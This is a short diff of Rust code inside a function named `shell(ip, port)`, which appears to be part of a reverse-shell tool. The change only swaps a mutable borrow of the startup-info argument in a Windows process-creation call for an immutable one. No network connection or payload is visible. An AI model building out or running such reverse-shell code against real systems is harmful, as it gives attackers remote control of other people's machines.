@@ -96,7 +96,7 @@ pub fn shell(ip: &str, port: u16) {
                        dw_creation_flags,
                        &lp_environment,
                        lp_current_directory,
-                       &mut startup_info,
+                       &startup_info,
                        &mut process_information);
     }
 }
